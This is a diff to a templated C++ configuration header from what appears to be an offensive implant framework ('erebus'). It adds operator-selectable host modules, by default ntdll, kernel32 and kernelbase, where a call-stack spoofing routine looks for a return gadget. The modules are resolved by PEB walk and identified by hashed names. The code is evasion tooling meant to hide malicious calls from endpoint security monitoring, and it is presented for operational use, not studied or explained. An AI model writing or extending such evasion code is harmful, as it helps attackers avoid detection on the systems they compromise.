@@ -123,10 +123,28 @@
 // ============================================
 // 0 = disabled
 // 1 = enabled — InitCallstackSpoof() runs in RunEvasionPatches(), locating
-//     `add rsp, 0x68; ret` in ntdll/kernel32. Call sites fill SpoofContext
-//     and dispatch through SpoofCall() (src/evasion/callstack_spoof.asm).
+//     `add rsp, 0x68; ret` in the operator-selected module list below.
+//     Call sites fill SpoofContext and dispatch through SpoofCall()
+//     (src/evasion/callstack_spoof_gas.S).
 #ifndef CONFIG_CALLSTACK_SPOOF_ENABLED
 #define CONFIG_CALLSTACK_SPOOF_ENABLED {{ CALLSTACK_SPOOF_ENABLED | default(0) }}
+#endif
+
+// Operator-selected gadget host modules. InitCallstackSpoof() iterates this
+// list in order and keeps the first match. Modules must already be mapped
+// into the host process (resolution is PEB-walk only). The gadget
+// displacement is fixed at 0x68 to match callstack_spoof_gas.S's stack
+// frame; changing it requires matching edits to the ASM `sub rsp, 112`.
+{%- set _cs_mods = CALLSTACK_SPOOF_MODULES | default(["ntdll.dll", "kernel32.dll", "kernelbase.dll"]) %}
+#ifndef CONFIG_CALLSTACK_SPOOF_MODULE_COUNT
+#define CONFIG_CALLSTACK_SPOOF_MODULE_COUNT {{ _cs_mods | length }}
+#endif
+#ifndef CONFIG_CALLSTACK_SPOOF_MODULES
+#define CONFIG_CALLSTACK_SPOOF_MODULES \
+    {%- for _m in _cs_mods %}
+            erebus::HashStringFowlerNollVoVariant1a("{{ _m }}"){% if not loop.last %}, \{% endif %}
+    {%- endfor %}
+
 #endif
 
 // --------------------------------------------------------------------------
